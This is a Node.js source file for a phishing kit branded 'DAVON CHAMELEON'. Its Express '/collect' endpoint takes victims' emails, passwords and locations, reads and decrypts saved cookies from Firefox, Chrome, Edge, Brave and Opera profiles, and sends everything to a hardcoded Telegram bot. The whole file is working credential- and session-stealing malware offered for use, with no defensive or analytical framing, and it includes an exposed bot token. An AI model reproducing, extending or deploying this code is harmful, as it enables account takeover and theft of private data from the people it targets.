// ------------------------- MODULES -------------------------
const fs = require('fs');
const path = require('path');
const os = require('os');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const keytar = require('keytar');
const nodeFetch = require('node-fetch'); 
const fetch = nodeFetch.default || nodeFetch;
const FormData = require('form-data');
const express = require('express');
const bodyParser = require('body-parser');

// ------------------------- EXPRESS SETUP -------------------------
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'templates', 'index.html')));

// ------------------------- CONFIG -------------------------
const OUTPUT_FILE = 'cookies.json';
const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
const TELEGRAM_CHAT_ID = "7574749243";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_FILE_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

// ------------------------- DEBUG -------------------------
function debugLog(msg) { console.log(`[DEBUG] ${msg}`); }

// ------------------------- WINDOWS DPAPI -------------------------
let dpapi;
if (process.platform === 'win32') {
    try { dpapi = require('win-dpapi'); } 
    catch { debugLog('win-dpapi not available'); }
}

// ------------------------- COOKIE HELPERS -------------------------
function parseExpiry(expiry) { const v = parseInt(expiry, 10); return isNaN(v) ? null : v; }
function parseChromiumExpiry(expires_utc) {
    const epoch = new Date('1601-01-01T00:00:00Z').getTime();
    return Math.floor(epoch / 1000 + expires_utc / 1000000);
}

// ------------------------- FIREFOX COOKIES -------------------------
async function extractFirefoxCookies() {
    const cookiesList = [];
    const profilesPath = process.platform === 'win32'
        ? path.join(os.homedir(), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        : path.join(os.homedir(), 'Library', 'Application Support', 'Firefox', 'Profiles');
    if (!fs.existsSync(profilesPath)) return cookiesList;
    const profiles = fs.readdirSync(profilesPath);
    for (const profile of profiles) {
        const dbPath = path.join(profilesPath, profile, 'cookies.sqlite');
        if (!fs.existsSync(dbPath)) continue;
        const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READONLY);
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`,
                (err, rows) => err ? reject(err) : resolve(rows || [])
            );
        });
        for (const r of rows) cookiesList.push({
            domain: r.host,
            name: r.name,
            value: r.value,
            path: r.path || '/',
            expires: parseExpiry(r.expiry),
            httpOnly: !!r.isHttpOnly,
            secure: !!r.isSecure
        });
        db.close();
    }
    return cookiesList;
}

// ------------------------- CHROMIUM COOKIES -------------------------
const BROWSER_PATHS = process.platform === 'win32'
    ? {
        Chrome: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        Edge: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
        Brave: path.join(os.homedir(), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
        Opera: path.join(os.homedir(), 'Roaming', 'Opera Software', 'Opera Stable'),
    }
    : {
        Chrome: path.join(os.homedir(), 'Library', 'Application Support', 'Google', 'Chrome'),
        Edge: path.join(os.homedir(), 'Library', 'Application Support', 'Microsoft Edge'),
        Brave: path.join(os.homedir(), 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser'),
        Opera: path.join(os.homedir(), 'Library', 'Application Support', 'com.operasoftware.Opera'),
    };

async function decryptChromiumCookie(encryptedValue, browser) {
    try {
        if (!encryptedValue || encryptedValue.length === 0) return '';
        if (process.platform === 'win32' && dpapi) {
            return dpapi.unprotectData(encryptedValue, null, 'CurrentUser').toString('utf-8');
        }
        const password = await keytar.getPassword('Chrome Safe Storage', browser) || 'peanuts';
        const key = crypto.createHash('sha1').update(password).digest().slice(0, 16);
        const iv = Buffer.alloc(16, 0);
        const prefix = encryptedValue.slice(0, 3).toString();
        if (prefix === 'v10' || prefix === 'v11') {
            const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
            return Buffer.concat([decipher.update(encryptedValue.slice(3)), decipher.final()]).toString();
        }
        return encryptedValue.toString();
    } catch (e) { return ''; }
}

async function extractChromiumCookies() {
    const cookiesList = [];
    for (const [browser, basePath] of Object.entries(BROWSER_PATHS)) {
        if (!fs.existsSync(basePath)) continue;
        const profiles = fs.readdirSync(basePath).filter(f => {
            const fullPath = path.join(basePath, f);
            return fs.existsSync(fullPath) && fs.statSync(fullPath).isDirectory() &&
                fs.existsSync(path.join(fullPath, 'Cookies'));
        });
        for (const profile of profiles) {
            const cookiePath = path.join(basePath, profile, 'Cookies');
            const db = new sqlite3.Database(cookiePath, sqlite3.OPEN_READONLY);
            const rows = await new Promise((resolve, reject) => {
                db.all(`SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies`,
                    (err, rows) => err ? reject(err) : resolve(rows || [])
                );
            });
            for (const r of rows) {
                const value = await decryptChromiumCookie(r.encrypted_value, browser);
                cookiesList.push({
                    domain: r.host_key,
                    name: r.name,
                    value,
                    path: r.path || '/',
                    expires: parseChromiumExpiry(r.expires_utc),
                    httpOnly: !!r.is_httponly,
                    secure: !!r.is_secure
                });
            }
            db.close();
        }
    }
    return cookiesList;
}

// ------------------------- SAVE COOKIES TO FILE -------------------------
async function saveCookies() {
    const cookies = (await extractFirefoxCookies()).concat(await extractChromiumCookies());
    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(cookies, null, 4));
    return cookies;
}

// ------------------------- TELEGRAM HELPERS -------------------------
async function sendTelegramMessage(text) {
    try { await fetch(TELEGRAM_API_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text}) }); }
    catch (err) { debugLog(`❌ Telegram send failed: ${err}`); }
}

async function sendTelegramFile(filePath) {
    try {
        const fileStream = fs.createReadStream(filePath);
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', fileStream);
        const res = await fetch(TELEGRAM_FILE_URL, { method: 'POST', body: formData });
        if (!res.ok) throw new Error(`Telegram file upload failed: ${res.statusText}`);
        debugLog("✅ Cookies sent to Telegram");
    } catch (err) { debugLog(`❌ Failed to send cookies: ${err}`); }
}

// ------------------------- COLLECT ROUTE -------------------------
app.post('/collect', async (req, res) => {
    try {
        const { email, password, attempt, city, country } = req.body;
        debugLog(`Received from frontend: ${email}, attempt ${attempt}`);

        // Save latest cookies
        const cookies = await saveCookies();

        // Build message
        const text = `☠️ DAVON CHAMELEON [${attempt}] ☠️\n` +
                     `Email: ${email}\n` +
                     `Password: ${password}\n` +
                     `City/Country: ${city}, ${country}\n` +
                     `Cookies collected: ${cookies.length}`;

        await sendTelegramMessage(text);

        if (cookies.length > 0) await sendTelegramFile(OUTPUT_FILE);

        res.json({ success: true });
    } catch (err) {
        debugLog(`❌ /collect error: ${err}`);
        res.status(500).json({ success: false, error: err.toString() });
    }
});

// ------------------------- START SERVER -------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
